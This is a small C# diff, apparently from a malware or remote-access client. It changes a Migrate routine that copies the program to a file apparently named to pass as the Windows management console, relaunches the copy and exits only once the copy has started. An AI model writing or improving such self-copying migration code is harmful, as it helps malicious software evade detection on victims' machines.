@@ -55,8 +55,14 @@ namespace Client
 
         public static void Migrate() {
             if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
-                Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString());
-            Environment.Exit(2);
+            {
+                try
+                {
+                    if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
+                        Environment.Exit(0);
+                }
+                catch { }
+            }
         }
     }
 }
